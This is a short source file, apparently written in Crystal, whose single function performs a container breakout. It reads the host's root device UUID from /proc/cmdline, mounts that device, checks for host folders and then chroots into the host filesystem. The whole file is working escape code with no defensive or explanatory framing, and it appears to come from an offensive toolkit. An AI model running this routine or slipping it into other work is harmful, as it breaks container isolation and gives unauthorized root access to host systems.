require "file_utils"

def device_breakout
    cmdline = File.read("/proc/cmdline")
    root_uuid= cmdline.split("root=").last.split(" ").first().sub("UUID=","")
    puts("Root device UUID: #{root_uuid}")
    puts("\n==> Let's try mounting this device.")

    Dir.mkdir("/mounted_hostos")
    if system("mount UUID=#{root_uuid} /mounted_hostos")
        proc_found = false
        puts("•  Mounted successfully")
        puts("==> Mounted device folders: ")
        directory_string_array = [] of String

        Dir.new("/mounted_hostos").each do |directory|
            directory_string_array << directory.to_s
        end

        directory_string_array.sort.each do |directory_string| 
            puts(directory_string)
            proc_found = true if directory_string.includes?("proc")
        end
        if proc_found
            puts("This looks like the host filesystem".green())
            puts("Chrooting the filesystem")
            system("chroot /mounted_hostos") # need to add uid 0 and chroot check
        end
    else
        puts("Failed to mount the root device")
    end
end